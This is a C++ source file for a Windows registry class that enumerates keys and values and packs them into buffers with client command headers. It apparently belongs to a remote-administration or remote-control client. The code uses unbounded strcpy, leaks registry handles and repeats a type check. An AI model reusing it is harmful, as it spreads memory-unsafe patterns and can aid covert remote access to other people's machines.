#include "RegisterOperation.h"




CRegisterOperation::CRegisterOperation(char IsToken)
{
	switch (IsToken)
	{
	case MHKEY_CLASSES_ROOT:
		MKEY = HKEY_CLASSES_ROOT;
		break;
	case MHKEY_CURRENT_USER:
		MKEY = HKEY_CURRENT_USER;
		break;
	case MHKEY_LOCAL_MACHINE:
		MKEY = HKEY_LOCAL_MACHINE;
		break;
	case MHKEY_USERS:
		MKEY = HKEY_USERS;
		break;
	case MHKEY_CURRENT_CONFIG:
		MKEY = HKEY_CURRENT_CONFIG;
		break;
	default:
		MKEY = HKEY_LOCAL_MACHINE;
		break;
	}
	ZeroMemory(KeyPath, MAX_PATH);
}

CRegisterOperation::~CRegisterOperation()
{

}

void CRegisterOperation::SetPath(char * FullPath)
{
	ZeroMemory(KeyPath, MAX_PATH);
	strcpy(KeyPath, FullPath);
}

char* CRegisterOperation::FindPath()
{
	char* BufferData = NULL;
	HKEY hKey;        //注册表返回句柄
	//打开注册表 User kdjf\kdjfkdjf
	if (RegOpenKeyEx(MKEY,KeyPath,0,KEY_ALL_ACCESS,&hKey)==ERROR_SUCCESS)
	{
		DWORD dwIndex = 0, NameSize, NameCount, NameMaxLen, Type;
		DWORD KeySize, KeyCount, KeyMaxLen, DataSize, MaxDataLen;
		//这就是枚举了
		if (RegQueryInfoKey(hKey,NULL,NULL,NULL,&KeyCount,
			&KeyMaxLen,NULL, &NameCount,&NameMaxLen,&MaxDataLen,NULL,NULL)!= ERROR_SUCCESS)
		{
			return NULL;
		}
		//一点保护措施
		KeySize = KeyMaxLen + 1;
		if (KeyCount >0 && KeySize>1)
		{
			int Size = sizeof(REGMSG)+1;
			//buf =new char [KeyCnt*KeySize+Size+1]
			DWORD DataSize = KeyCount*KeySize + Size + 1;  //[CLIENT_REGISTER_REG_PATH][2 11 ccccccc\0][11][11]
			BufferData = (char*)LocalAlloc(LPTR, DataSize);
			ZeroMemory(BufferData, DataSize);
			BufferData[0] = CLIENT_REGISTER_PATH_DATA;
			REGMSG msg;   //数据头
			msg.size = KeySize;
			msg.count = KeyCount;
			memcpy(BufferData + 1, (VOID*)&msg, Size);

			char* szTemp = new char[KeySize];
			for (dwIndex  = 0; dwIndex < KeyCount; dwIndex++) //枚举项
			{
				ZeroMemory(szTemp, KeySize);
				DWORD i = KeySize;//21
				RegEnumKeyEx(hKey, dwIndex, szTemp, &i, NULL, NULL, NULL, NULL);
				strcpy(BufferData + dwIndex*KeySize + Size, szTemp);
			}
			delete[]szTemp;
			RegCloseKey(hKey);
		}
	}
	return BufferData;
}

char* CRegisterOperation::FindKey()
{
	char *szValueName; //键值
	char *szKeyName; //子键名字
	LPBYTE szValueData; //键值数据

	char *BufferData = NULL;
	HKEY hKey;
	if (RegOpenKeyEx(MKEY, KeyPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)//打开
	{
		DWORD dwIndex = 0, NameSize, NameCount, NameMaxLen, Type;
		DWORD KeySize, KeyCount, KeyMaxLen, DataSize, MaxDataLen;
		//这就是枚举了
		if (RegQueryInfoKey(hKey, NULL, NULL, NULL, &KeyCount,
			&KeyMaxLen, NULL, &NameCount, &NameMaxLen, &MaxDataLen, NULL, NULL) != ERROR_SUCCESS)
		{
			return NULL;
		}
		if (NameCount>0 && MaxDataLen>0 && NameMaxLen>0 )
		{
			DataSize = MaxDataLen + 1;
			NameSize = NameMaxLen + 100;
			REGMSG Msg;
			Msg.count = NameCount;   //总个数
			Msg.size = NameSize;	 //名字大小
			Msg.valsize = DataSize;	//数据大小
			int msgsize = sizeof(REGMSG);
			//头        标记    名字      数据
			//bufferLenght
			DWORD size = sizeof(REGMSG)+sizeof(BYTE)*NameCount
				+NameSize*NameCount+DataSize*NameCount+10;
			BufferData = (char*)LocalAlloc(LPTR, size);
			ZeroMemory(BufferData, size);
			BufferData[0] = CLIENT_REGISTER_KEY_DATA;   //命令头
			memcpy(BufferData+1,(void*)&Msg,msgsize);   //数据头

			szValueName = (char*)malloc(NameSize);
			szValueData = (LPBYTE)malloc(DataSize);

			char *szTemp = BufferData + msgsize + 1;
			for ( dwIndex = 0; dwIndex < NameCount; dwIndex++)//枚举键值
			{
				ZeroMemory(szValueName, NameSize);
				ZeroMemory(szValueData, DataSize);

				DataSize = MaxDataLen + 1;
				NameSize = NameMaxLen + 100;

				RegEnumValue(hKey,dwIndex,szValueName,&NameSize,
					NULL,&Type,szValueData,&DataSize); //读取建值
				if (Type ==REG_SZ)
				{
					szTemp[0] = MREG_SZ;
				}
				if (Type == REG_SZ)
				{
					szTemp[0] = MREG_SZ;
				}

				if (Type == REG_DWORD)
				{
					szTemp[0] = MREG_DWORD;
				}
				if (Type == REG_BINARY)
				{
					szTemp[0] = MREG_BINARY;
				}

				if (Type == REG_EXPAND_SZ)
				{
					szTemp[0] = MREG_EXPAND_SZ;
				}
				szTemp += sizeof(BYTE);
				strcpy(szTemp, szValueName);
				szTemp += Msg.size;
				memcpy(szTemp, szValueData, Msg.valsize);
				szTemp += Msg.valsize;
			}
			free(szValueData);
			free(szValueName);
		}
	}
	return BufferData;
}
